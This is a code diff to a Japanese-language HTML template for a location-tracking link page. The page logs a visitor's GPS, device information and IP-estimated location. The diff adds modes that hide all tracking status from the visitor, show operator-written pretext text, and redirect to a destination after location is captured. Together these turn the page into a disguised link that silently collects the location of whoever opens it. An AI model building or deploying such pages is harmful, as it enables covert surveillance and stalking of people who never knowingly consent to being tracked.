@@ -1,12 +1,19 @@
+{% set show_map = ui in ("map", "full") %}
+{% set show_full = ui == "full" %}
 <!doctype html>
 <html lang="ja"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#0f1115">
 <title>{{ link.name }}</title>
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+{% if show_map %}<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">{% endif %}
 <style>
-body{margin:0;background:#0f1115;color:#e6e9ef;font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif}
+html,body{margin:0;background:#0f1115;color:#e6e9ef;
+  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;-webkit-text-size-adjust:100%}
 .wrap{padding:18px;max-width:520px;margin:0 auto}
+body.ui-none .wrap{padding:0}
+body.ui-ask .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;text-align:center}
+.ask-t{font-size:15px;margin:0 0 10px}
 h1{font-size:17px;margin:0 0 6px}
 p{color:#9aa3b2;font-size:13px;margin:0 0 14px}
 .lt-on{color:#2ecc71;font-size:13px}.lt-warn{color:#f0b429;font-size:13px}.lt-dim{color:#7b8494;font-size:13px}
@@ -20,8 +27,16 @@ button.ghost{background:#1b2028;color:#cfd6e2;border:1px solid #2b323d}
 .tiny{font-size:11px;color:#5f6875;margin-top:12px;line-height:1.6}
 a{color:#4c8dff}
 label.chk{display:flex;gap:6px;align-items:center;font-size:12px;color:#9aa3b2;margin-top:6px}
-</style></head><body>
+/* none / map のときは状態表示をDOMにだけ残す */
+body.ui-none #lt_st,body.ui-none #lt_time,body.ui-none #lt_now,
+body.ui-none #lt_perm,body.ui-none #lt_srv,
+body.ui-map #lt_st,body.ui-map #lt_time,body.ui-map #lt_now,
+body.ui-map #lt_perm,body.ui-map #lt_srv{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
+body.ui-map #lt_ia,body.ui-ask #lt_ia{display:none !important}
+</style></head><body class="ui-{{ ui }}">
 <div class="wrap">
+
+{% if show_full %}
   <h1>{{ link.name }}</h1>
   <p>{{ link.note or "位置情報を許可すると、この画面を開いている間ずっと記録されます" }}</p>
 
@@ -38,24 +53,38 @@ label.chk{display:flex;gap:6px;align-items:center;font-size:12px;color:#9aa3b2;m
       <span style="margin-left:auto" class="mono" id="lt_time">00:00</span></div>
     <div class="mono" id="lt_now" style="margin-top:6px">-</div>
     <div style="margin-top:6px;font-size:11px;color:#5f6875">
-      許可状態: <span id="lt_perm">unknown</span>
-      ／ サーバ側: <span id="lt_srv">-</span></div>
+      許可状態: <span id="lt_perm">unknown</span>／ サーバ側: <span id="lt_srv">-</span></div>
   </div>
 
-  <div id="map"></div>
-  <label class="chk"><input type="checkbox" id="follow" checked> 最新位置に地図を追従する</label>
+{% elif ui == "ask" %}
+  <div>
+    <div class="ask-t">{{ ask_text }}</div>
+    <div id="lt_st" class="lt-dim">{{ wait_text }}</div>
+    <span id="lt_time"></span><span id="lt_now"></span>
+    <span id="lt_perm"></span><span id="lt_srv"></span>
+  </div>
 
+{% else %}
+  <span id="lt_st"></span><span id="lt_time"></span><span id="lt_now"></span>
+  <span id="lt_perm"></span><span id="lt_srv"></span>
+{% endif %}
+
+{% if show_map %}<div id="map"></div>{% endif %}
+
+{% if show_full %}
+  <label class="chk"><input type="checkbox" id="follow" checked> 最新位置に地図を追従する</label>
   <div class="row" style="margin-top:10px">
     <button id="lt_go">開始</button>
     <button class="ghost" id="lt_stop">停止</button>
     {% if dest %}<a href="{{ dest }}"><button class="ghost">飛び先へ</button></a>{% endif %}
   </div>
-
   <p class="tiny">
-    この画面を閉じると記録は止まります（閉じた瞬間の位置は送信します）。<br>
+    {% if dest_redirect %}位置情報を許可すると、取得後に飛び先へ自動で移動します。許可しない間はこの画面に留まります。{% endif %}<br>
     iPhoneは画面ロックや他アプリへの切り替えで止まりやすいので、その間は「画面をつけたまま」が確実です。<br>
     位置を許可しなくても、IPからの推定地点だけは記録されます。
   </p>
+{% endif %}
+
 </div>
 
 <script>
@@ -64,25 +93,33 @@ window.LT_HIT   = {{ hit_id }};
 window.LT_IV    = {{ iv }};
 window.LT_MAX   = {{ maxmin }};
 window.LT_NONCE = {{ nonce|tojson }};
-window.LT_GEO   = 0;   /* GPSは live.js が担当（collect.js は端末情報のみ） */
+window.LT_GEO   = 0;
+window.LT_BRIEF = {{ 1 if ui == "ask" else 0 }};
+window.LT_DEST  = {{ (dest if dest_redirect else "")|tojson }};
+window.LT_DEST_MIN = {{ dest_min }};
+window.LT_WAIT     = {{ wait_sec }};
+window.LT_DENY_REDIRECT = {{ 1 if deny_redirect else 0 }};
+window.LT_ASK_TEXT  = {{ ask_text|tojson }};
+window.LT_OK_TEXT   = {{ ok_text|tojson }};
+window.LT_DENY_TEXT = {{ deny_text|tojson }};
 </script>
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+{% if show_map %}<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>{% endif %}
 <script src="/static/collect.js"></script>
 <script src="/static/live.js"></script>
+{% if show_map %}
 <script>
 (function () {
   var CODE = {{ code|tojson }};
   var map = L.map('map', { zoomControl: false, attributionControl: false })
              .setView([36.2, 138.2], 5);
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-
   var gps = L.polyline([], { color: '#4c8dff', weight: 4, opacity: .85 }).addTo(map);
   var me = L.circleMarker([36.2, 138.2], { radius: 8, color: '#2ecc71',
              fillColor: '#2ecc71', fillOpacity: .9 }).addTo(map);
   var acc = L.circle([36.2, 138.2], { radius: 0, color: '#2ecc71',
              weight: 1, fillOpacity: .08 }).addTo(map);
   var follow = document.getElementById('follow');
-  var lastId = 0, first = true, n = 0;
+  var lastId = 0, first = true;
 
   function setTxt(id, v) { var e = document.getElementById(id); if (e) e.textContent = v; }
 
@@ -91,14 +128,12 @@ window.LT_GEO   = 0;   /* GPSは live.js が担当（collect.js は端末情報�
       var r = await fetch('/api/track/' + CODE + '?since=' + lastId + '&limit=500',
                           { cache: 'no-store' });
       if (!r.ok) { setTxt('lt_srv', 'offline'); return; }
-      var j = await r.json();
-      var pts = j.points || [], lastGps = null;
+      var j = await r.json(), pts = j.points || [], lastGps = null, a = 0;
       for (var i = 0; i < pts.length; i++) {
         var p = pts[i];
         if (p.id > lastId) lastId = p.id;
         if (p.lat === null || p.lat === undefined) continue;
-        n++;
-        if (p.src === 'gps') { gps.addLatLng([p.lat, p.lon]); lastGps = [p.lat, p.lon]; }
+        if (p.src === 'gps') { gps.addLatLng([p.lat, p.lon]); lastGps = [p.lat, p.lon]; if (p.acc) a = p.acc; }
         else {
           L.circleMarker([p.lat, p.lon], { radius: 4, color: '#f0b429',
             fillColor: '#f0b429', fillOpacity: .7 }).addTo(map);
@@ -107,12 +142,8 @@ window.LT_GEO   = 0;   /* GPSは live.js が担当（collect.js は端末情報�
       }
       if (lastGps) {
         me.setLatLng(lastGps);
-        var a = 0;
-        for (var k = pts.length - 1; k >= 0; k--) {
-          if (pts[k].src === 'gps' && pts[k].acc) { a = pts[k].acc; break; }
-        }
         acc.setLatLng(lastGps).setRadius(a || 0);
-        if (follow.checked) map.setView(lastGps, Math.max(map.getZoom(), 16));
+        if (!follow || follow.checked) map.setView(lastGps, Math.max(map.getZoom(), 16));
       }
       setTxt('lt_srv', (j.live ? '受信中' : '待機') + ' / ' + (j.count || 0) + '点');
     } catch (e) { setTxt('lt_srv', 'offline'); }
@@ -121,4 +152,5 @@ window.LT_GEO   = 0;   /* GPSは live.js が担当（collect.js は端末情報�
   setInterval(poll, 5000);
 })();
 </script>
+{% endif %}
 </body></html>
